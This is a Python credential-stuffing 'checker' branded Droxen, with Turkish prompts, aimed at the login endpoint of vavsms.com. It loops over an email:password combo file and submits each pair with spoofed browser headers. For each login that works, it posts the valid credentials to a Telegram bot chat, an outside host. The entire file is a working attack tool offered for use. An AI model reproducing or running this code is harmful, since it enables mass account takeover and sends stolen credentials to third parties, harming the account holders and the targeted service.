import requests
import cfonts
import os

Droxen = cfonts.render('Droxen', colors=['white', 'blue'], align='center')
print(f'''\n
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓   
     
                      {Droxen}
      ~ Programmer : @En4rt | Channel: @DroxenTool ~\n   vavsms.com checker
 
   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛    
''')
token = input(' - Token Girin :')
id = input(' - İd Girin :')
EnartCombo = input(' - Combo Girin :')

os.system('cls' if os.name == 'nt' else 'clear')
print(Droxen)
print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

with open(EnartCombo, 'r') as file:
    for line in file:
        try:
            email, pas = line.strip().split(':')
            session = requests.Session()
            session.get("https://vavsms.com/ajax/login")
            ses = session.cookies.get("ci_session")
            
            response = requests.post(
                'https://vavsms.com/ajax/login',
                cookies={
                    'ci_session': ses,
                },
                headers={
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'referer': 'https://vavsms.com/tr/login',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest',
                },
                data = {
                'email': email,
                'password': pas,
            }
            )
            
            if "true" in response.text:
                print(f'✅ Giriş Başarılı  | {email}:{pas}')
                requests.post(
    f"https://api.telegram.org/bot{token}/sendMessage",
    data={"chat_id": id, "text": f"✅Durum: Giriş Başarılı\n📧Mail: {email}\n🔑Password: {pas}\n🔗Url: https://vavsms.com"}
)
            else:
                print(f'❌ Giriş Başarısız | {email}:{pas}')

        except Exception as e:
            print(f'Hata: {e}')